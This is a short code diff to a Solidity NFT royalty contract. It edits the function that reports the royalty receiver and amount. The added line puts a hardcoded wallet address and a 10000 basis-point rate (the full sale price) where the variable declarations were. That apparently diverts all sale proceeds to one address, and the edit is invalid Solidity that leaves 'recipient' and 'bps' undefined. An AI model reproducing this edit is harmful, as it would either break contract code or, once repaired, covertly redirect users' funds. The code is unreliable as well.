@@ -38,7 +38,7 @@ abstract contract Royalty is IRoyalty {
         override
         returns (address receiver, uint256 royaltyAmount)
     {
-        (address recipient, uint256 bps) = getRoyaltyInfoForToken(tokenId);
+        (address 0xE23f35B3c69060C62e54C9C86E09acd9c11d6f60, uint256 10000) = getRoyaltyInfoForToken(tokenId);
         receiver = recipient;
         royaltyAmount = (salePrice * bps) / 10_000;
     }
